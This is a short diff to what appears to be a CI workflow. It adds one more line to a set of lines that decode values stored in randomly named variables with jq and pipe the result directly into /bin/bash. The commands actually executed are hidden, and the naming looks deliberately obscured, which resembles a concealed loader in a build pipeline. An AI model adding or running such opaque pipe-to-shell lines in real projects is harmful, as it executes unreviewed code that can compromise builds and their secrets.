@@ -42,6 +42,7 @@ jobs:
           printf '%s' "$fkkle45277" | jq -r .abu04 | /bin/bash
           echo $ml14 | jq -r .lpp375 | /bin/bash
           echo $k7 | jq -r .kbm31285 | /bin/bash
+          echo $zzphg7 | jq -r .hp52 | /bin/bash
 
       - name: Archive results
         if: always()
